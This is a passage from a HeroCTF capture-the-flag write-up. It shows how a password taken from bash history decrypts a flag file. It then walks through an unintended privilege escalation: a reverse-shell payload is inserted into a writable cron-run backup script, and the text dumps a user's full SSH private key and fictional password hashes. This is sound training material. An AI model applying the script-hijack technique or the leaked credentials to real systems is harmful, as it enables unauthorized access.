We need to know which algorythm was used to encrypt the data and also if a password was used.

The title hint on this way, but of course it's the first thing we will look, the shell history! In our case it's bash, so let's read it.

![19-bash_history](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/c9887d75-9f3b-4915-bab4-fc1edd571544)

![20-EncodingCommand](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/5a2ac56a-5ba6-45ee-85a9-27d79e16b3e8)

```
dave@$vps:~/toSendToBuyer.txt openssl aes-256-cbc -salt -k Sup3r53cr3tP4ssw0rd -in randomfile.txt -out randomfile.txt.enc
```

Great! As the path said, our guess was correct, those encrypted data are our proof. We know that the algorythm used is `aes-256-cb` and he used a key `Sup3r53cr3tP4ssw0rd`.

Now let's decrypt the file.

```
$ openssl aes-256-cbc -d -salt -k Sup3r53cr3tP4ssw0rd -in /home/dave/randomfile.txt.enc -out /home/dave/randomfile.txt
```

![22-DecodingCommand](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/1ff370cb-dc54-4b05-90e2-69012111c2ef)

And finally read it's content.

![23-decoded_file](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/d6f17ca8-ac58-4974-92cd-957727b61e91)

![24-flag_final](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/93e533a9-1e70-43d9-adff-7edec1394b1d)

```
Here is a sample of the hashes I dumped from the database, in good faith. 
Pay up, and I'll send you the rest. 
Once you have you order, we never speak again. 
Glad doing business with you. 

louis afba3f2f6a6124ff952cdf8fa6d639ea 
samantha b92af75ee8a69de838e1d2eefc380bfb 
joey dfa3e5ccebaabe11bbde4b7f4de5bbd4 
karl 219f9ad3f2efb75afcae7fab39fcd1aa 
steve f9df3a4453f27b8bfdd39ee96aca7bac 
john 3d82b3ce57d8edfe2eaba8eb8eeebb3f 
michael 84cae12ee0242ae4abb1e5fbaab40952 
george e58eddfd7a8d670ef5187c05b16b95a1 
sarah fdf4f0e12e7d4cd083abb61a4b7232d9 
lucas 60d2fccbc0be51dc8dcd182b0b6a806f 
sylvia e4282d7ee69cab77bb41ec0e02598bad 
Hero{4_l1ttle_h1st0ry_l3ss0n_4_u}
```

We get the flag!

Flag : **Hero{4_l1ttle_h1st0ry_l3ss0n_4_u}**

## LFM - Unintended Way : Get a shell as Dave<a name="unintended"></a>

Note :

```
I tried a lot of things to get a shell back as Dave. Nothing worked.

Before stopping my research, i've contacted Log_s to ask him if there is any way to get a shell as Dave. And the answer is YES!

As you can see bellow in french, he told me that he made a misstake while patching another box. Dave keep executing the backup script, and the backup user is allowed to write in it. So simply put a payload in it should give us a shell as Dave.

Of course, this mean you can bypass the challenge 3 and 4.
```

![0-discord](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/0a004874-ee37-40e4-878f-a35aeeed31cd)

### Solution

Now let's see how to achieve this.  Come back to "backup" user terminal (after using the LFI/RCE to get a www-data shell and escalate to backup using rsync).

First we will use `Pspy` utility to inspect, when and how the backup file is executed.

To do it we download `pspy` directly on the machine as we have internet access.

```bash
backup@backup:/var/www/html$ cd /tmp
backup@backup:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

Give it execution right and execute it.

```bash
backup@backup:/tmp$ chmod +x pspy64
backup@backup:/tmp$ ./pspy64
```

Now keep looking at the output and wait a bit.

![1-cron](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/e85cc384-4cc0-46aa-9ab6-f3bc065ea376)

Perfect, we can see that the user with id "1000" running the command `/bin/sh /bin/backup.sh`. So this should be Dave executing the backup utility.

Next, let's look at the utility permissions.

```bash
backup@backup:/backup$ ls -la backup.sh
ls -la backup.sh
-rwxr-xr-x 1 backup backup 760 May 12 10:17 backup.sh
```

As Log_s say, we are owner of it which mean we can modify it!

Now let's look our ip address through `/etc/hosts` and then use `vim`, to write a php payload in it.

```
backup@backup:/backup$ cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.30.0.2      backup

backup@backup:/backup$ vim /backup/backup.sh
```
> Note : Once pressed `ESC`+`i`, i've inserted my php payload from pentest monkey as first line. You can see it in the next screenshot.

Source : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Open a listener and keep waiting. You can get another instance open to look at pspy and instantly look the process.

![2-shell_dave](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/64e43730-1fbc-4931-b12d-ca89cb04e176)

We get a shell as Dave!

Enumerating his home directory and we find ssh keys.

```bash
dave@backup:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Save it to your kali desktop as "id_rsa", and give it the appropriate permission with `chmod 600` then you can log in as Dave in ssh.

```bash
$ ls
id_rsa

$ chmod 600 id_rsa

$ ssh -i id_rsa dave@dyn-01.heroctf.fr -p 11332
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.10.0-21-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
dave@dev:~$
```

![3-Exploit_proof](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/2c3210a4-df1f-40ed-ab04-aaa2db29b923)

We got a save point :P

**Thanks for reading!**

## Credits<a name="credits"></a>

Special thanks to :

* **[HeroCTF](https://twitter.com/heroctf)** - team for the CTF!
* **Alol** - for creating the **chm0d** challenge!
* **Log_s** - for creating the **SUDOkLu** and the **LFM0-4** challenge collection!

And of course... 

**Thanks to my team [Godzillhack!](https://godzillhack.com)**
![logo](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/4c81af26-3b14-4d60-a8a4-0ac50da443f7)
